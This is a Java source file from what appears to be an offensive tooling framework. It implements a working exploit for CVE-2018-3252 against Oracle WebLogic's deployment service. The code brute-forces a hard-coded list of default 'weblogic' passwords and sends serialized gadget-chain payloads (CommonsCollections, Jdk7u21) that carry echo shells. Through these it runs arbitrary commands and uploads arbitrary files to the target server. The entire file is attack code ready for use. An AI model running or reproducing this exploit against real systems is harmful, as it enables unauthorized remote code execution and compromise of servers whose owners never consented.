package superman.vuls;

import sun.misc.BASE64Encoder;
import superman.core.Log;
import superman.core.Store;
import superman.payloads.*;
import superman.shells.HttpEchoShell12;
import superman.shells.HttpEchoShell;
import superman.util.HttpClient;
import superman.util.HttpResult;
import weblogic.common.internal.PeerInfo;
import weblogic.deploy.common.DeploymentObjectOutputStream;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class CVE_2018_3252 implements EchoVul {
    private String protocol;
    private String host;
    private int port;
    private String url;
    protected List<Object> payloads;
    private String[] users;
    private String[] passes;
    private String user;
    private String pass;
    private Object payload;

    private void initPayloads(){
        payloads=new ArrayList<Object>();
        try {
            payloads.add(new CommonsCollections3().getObject(HttpEchoShell.class));
            payloads.add(new CommonsCollections3().getObject(HttpEchoShell12.class));
            payloads.add(new CommonsCollections7().getObject(HttpEchoShell.class));
            payloads.add(new CommonsCollections7().getObject(HttpEchoShell12.class));
            payloads.add(new Jdk7u21().getObject(HttpEchoShell.class));
            payloads.add(new Jdk7u21().getObject(HttpEchoShell12.class));
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    private HttpResult exec(String cmd, Object payload, String user, String pass) throws Exception {
        String peerInfoVersion= PeerInfo.VERSION_60.getVersionAsString();
        byte[] buf=null;
        try {
            buf=serialize(payload,peerInfoVersion);
            //System.out.println(ByteUtil.bytesToHex(buf));
        } catch (Exception e) {
            e.printStackTrace();
        }
        Map<String, String> headers = new HashMap<String, String>();
        headers.put("Content-type", "text/xml");
        headers.put("wl_request_type", "data_transfer_request");
        headers.put("Upgrade-Insecure-Requests", "1");
        headers.put("deployment_request_id", "1");
        headers.put("server_version",peerInfoVersion);
        headers.put("username", user);
        headers.put("password", pass);
        headers.put("type", "exec");
        headers.put("cmd", cmd);
        HttpResult res = HttpClient.post(url,buf, headers);

        return res;
    }
    private void upload(String uploadPath, String text, Object payload, String user, String pass) throws Exception {
        String peerInfoVersion= PeerInfo.VERSION_60.getVersionAsString();
        byte[] buf=null;
        try {
            buf=serialize(payload,peerInfoVersion);
        } catch (Exception e) {
            e.printStackTrace();
        }
        Map<String, String> headers = new HashMap<String, String>();
        headers.put("wl_request_type", "data_transfer_request");
        headers.put("Upgrade-Insecure-Requests", "1");
        headers.put("deployment_request_id", "1");
        headers.put("server_version", PeerInfo.VERSION_60.getVersionAsString());
        headers.put("username", user);
        headers.put("password", pass);
        headers.put("type", "upload");
        headers.put("path", uploadPath);
        String s=null;
        try {
            s= URLEncoder.encode(new BASE64Encoder().encode(text.getBytes()),"utf-8");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        headers.put("text", s);
        HttpResult res = HttpClient.post(url,buf, headers);
    }

    private byte[] serialize(Object payload, String peerInfo) throws Exception {
        ByteArrayOutputStream bout=new ByteArrayOutputStream();
        DeploymentObjectOutputStream out =new DeploymentObjectOutputStream(bout,peerInfo);
        out.writeObject(payload);
        out.flush();
        return bout.toByteArray();
    }


    @Override
    public String check(String protocol, String host, int port) {
        init(protocol,host, port);
        int errorCount=0;
        boolean findPass=false;
        for(Object payload:payloads){
            Log.info("检查payload:"+payload.getClass().getSimpleName());
            if(findPass){
                try {
                    HttpResult res=exec("whoami",payload,user,pass);
                    if(res!=null){
                        List<String> isVul=res.getHeaders().get("isVul");
                        if(isVul!=null){
                            this.payload=payload;
                            Store.ECHO_VUL=this;
                            return res.getData().trim();
                        }
                    }
                } catch (Exception e) {
                    if(e instanceof IOException ){
                        if(e.getMessage().indexOf("500")>0){
                            continue;
                        }
                    }
                    e.printStackTrace();
                    return null;
                }
            }else{
                for(String user:users) {
                    if(findPass){
                        break;
                    }
                    for (String pass : passes) {
                        if (errorCount >= 5) {
                            return null;
                        }
                        try {
                            HttpResult res = exec("whoami", payload, user, pass);
                            if (res != null) {
                                List<String> isVul = res.getHeaders().get("isVul");
                                if (isVul != null) {
                                    Log.info("weblogic弱口令:"+user+","+pass);
                                    this.user = user;
                                    this.pass = pass;
                                    this.payload = payload;
                                    Store.ECHO_VUL=this;
                                    return res.getData().trim();
                                }
                            }
                        } catch (Exception e) {
                            if(e instanceof IOException ){
                                if(e.getMessage().indexOf("401")>0){
                                    errorCount++;
                                    continue;
                                }else if(e.getMessage().indexOf("500")>0){
                                    Log.info("weblogic弱口令:"+user+","+pass);
                                    this.user = user;
                                    this.pass = pass;
                                    findPass = true;
                                    break;
                                }

                            }
                            e.printStackTrace();
                        }
                    }
                }
            }
        }
        return null;
    }

    private void init(String protocol, String host, int port) {
        this.protocol = protocol;
        this.host = host;
        this.port = port;
        this.url=String.format("%s://%s:%s/bea_wls_deployment_internal/DeploymentService",protocol,host,port);
        users=new String[]{"weblogic"};
        passes=new String[]{"weblogic","123qwe123","weblogic11","weblogic123","weblogic@123","weblogic@123"};
        initPayloads();
    }

    @Override
    public String exec(String cmd) {
        try {
            HttpResult res=exec(cmd,payload,user,pass);
            if(res!=null){
                List<String> isVul=res.getHeaders().get("isVul");
                if(isVul!=null){
                    return res.getData().trim();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    @Override
    public void upload(String path, String text) {
        try {
            upload(path,text,payload,user,pass);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void remove() {

    }
}
